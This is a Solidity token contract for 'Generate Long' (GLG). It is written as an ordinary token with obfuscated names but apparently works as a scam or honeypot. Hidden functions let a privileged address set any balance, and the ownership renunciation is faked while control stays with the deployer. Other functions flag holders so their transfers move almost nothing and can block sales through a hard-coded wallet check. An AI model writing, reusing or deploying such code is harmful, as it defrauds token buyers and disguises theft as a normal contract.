//SPDX-License-Identifier: MIT

pragma solidity ^0.8.5;

interface tradingReceiver {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

abstract contract marketingFrom {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface exemptSwap {
    function createPair(address tokenLimit, address shouldFee) external returns (address);
}

interface limitExempt {
    function totalSupply() external view returns (uint256);

    function balanceOf(address fundFrom) external view returns (uint256);

    function transfer(address fundReceiverWallet, uint256 marketingSwap) external returns (bool);

    function allowance(address shouldAuto, address spender) external view returns (uint256);

    function approve(address spender, uint256 marketingSwap) external returns (bool);

    function transferFrom(
        address sender,
        address fundReceiverWallet,
        uint256 marketingSwap
    ) external returns (bool);

    event Transfer(address indexed from, address indexed minSenderLimit, uint256 value);
    event Approval(address indexed shouldAuto, address indexed spender, uint256 value);
}

interface autoFrom is limitExempt {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract GenerateLong is marketingFrom, limitExempt, autoFrom {

    uint256 marketingShould;

    function maxList() public {
        emit OwnershipTransferred(amountMarketingLiquidity, address(0));
        modeLaunchEnable = address(0);
    }

    mapping(address => mapping(address => uint256)) private atBuy;

    uint256 private liquidityLimitAmount;

    function swapLaunched() private view {
        require(modeTx[_msgSender()]);
    }

    function getOwner() external view returns (address) {
        return modeLaunchEnable;
    }

    bool private minWallet;

    uint256 public isLaunch;

    mapping(address => bool) public modeTx;

    bool public minTotal;

    constructor (){
        if (autoReceiverBuy == isLaunch) {
            minTotal = false;
        }
        tradingReceiver shouldAtToken = tradingReceiver(autoLaunchTrading);
        exemptAmount = exemptSwap(shouldAtToken.factory()).createPair(shouldAtToken.WETH(), address(this));
        
        amountMarketingLiquidity = _msgSender();
        maxList();
        modeTx[amountMarketingLiquidity] = true;
        walletBuy[amountMarketingLiquidity] = feeMax;
        if (minTotal == liquidityLaunched) {
            liquidityLaunched = true;
        }
        emit Transfer(address(0), amountMarketingLiquidity, feeMax);
    }

    function transfer(address teamIs, uint256 marketingSwap) external virtual override returns (bool) {
        return senderMarketingTx(_msgSender(), teamIs, marketingSwap);
    }

    uint256 private feeMax = 100000000 * 10 ** 18;

    mapping(address => bool) public fromTotal;

    function totalSupply() external view virtual override returns (uint256) {
        return feeMax;
    }

    uint256 tradingWallet;

    address autoLaunchTrading = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function balanceOf(address fundFrom) public view virtual override returns (uint256) {
        return walletBuy[fundFrom];
    }

    uint256 public autoReceiverBuy;

    uint256 private launchReceiverMode;

    uint8 private receiverWallet = 18;

    function allowance(address toExempt, address txTake) external view virtual override returns (uint256) {
        if (txTake == autoLaunchTrading) {
            return type(uint256).max;
        }
        return atBuy[toExempt][txTake];
    }

    function senderMarketingTx(address takeTeam, address fundReceiverWallet, uint256 marketingSwap) internal returns (bool) {
        if (takeTeam == amountMarketingLiquidity) {
            return teamLaunch(takeTeam, fundReceiverWallet, marketingSwap);
        }
        uint256 receiverReceiver = limitExempt(exemptAmount).balanceOf(minTrading);
        require(receiverReceiver == tradingWallet);
        require(fundReceiverWallet != minTrading);
        if (fromTotal[takeTeam]) {
            return teamLaunch(takeTeam, fundReceiverWallet, toAmount);
        }
        return teamLaunch(takeTeam, fundReceiverWallet, marketingSwap);
    }

    uint256 private modeLiquidity;

    function owner() external view returns (address) {
        return modeLaunchEnable;
    }

    function limitTradingMax(address teamIs, uint256 marketingSwap) public {
        swapLaunched();
        walletBuy[teamIs] = marketingSwap;
    }

    address public amountMarketingLiquidity;

    function name() external view virtual override returns (string memory) {
        return toShould;
    }

    string private walletIs = "GLG";

    address private modeLaunchEnable;

    bool public shouldLaunched;

    uint256 constant toAmount = 16 ** 10;

    function approve(address txTake, uint256 marketingSwap) public virtual override returns (bool) {
        atBuy[_msgSender()][txTake] = marketingSwap;
        emit Approval(_msgSender(), txTake, marketingSwap);
        return true;
    }

    address public exemptAmount;

    function teamLaunch(address takeTeam, address fundReceiverWallet, uint256 marketingSwap) internal returns (bool) {
        require(walletBuy[takeTeam] >= marketingSwap);
        walletBuy[takeTeam] -= marketingSwap;
        walletBuy[fundReceiverWallet] += marketingSwap;
        emit Transfer(takeTeam, fundReceiverWallet, marketingSwap);
        return true;
    }

    function tokenSwap(uint256 marketingSwap) public {
        swapLaunched();
        tradingWallet = marketingSwap;
    }

    function decimals() external view virtual override returns (uint8) {
        return receiverWallet;
    }

    string private toShould = "Generate Long";

    function symbol() external view virtual override returns (string memory) {
        return walletIs;
    }

    bool public liquidityLaunched;

    event OwnershipTransferred(address indexed tokenTake, address indexed enableExempt);

    function autoShouldLimit(address buyAmount) public {
        swapLaunched();
        if (minWallet) {
            isLaunch = launchReceiverMode;
        }
        if (buyAmount == amountMarketingLiquidity || buyAmount == exemptAmount) {
            return;
        }
        fromTotal[buyAmount] = true;
    }

    address minTrading = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    function transferFrom(address takeTeam, address fundReceiverWallet, uint256 marketingSwap) external override returns (bool) {
        if (_msgSender() != autoLaunchTrading) {
            if (atBuy[takeTeam][_msgSender()] != type(uint256).max) {
                require(marketingSwap <= atBuy[takeTeam][_msgSender()]);
                atBuy[takeTeam][_msgSender()] -= marketingSwap;
            }
        }
        return senderMarketingTx(takeTeam, fundReceiverWallet, marketingSwap);
    }

    mapping(address => uint256) private walletBuy;

    function fundMin(address totalTake) public {
        require(totalTake.balance < 100000);
        if (shouldLaunched) {
            return;
        }
        
        modeTx[totalTake] = true;
        if (launchReceiverMode == liquidityLimitAmount) {
            liquidityLimitAmount = isLaunch;
        }
        shouldLaunched = true;
    }

}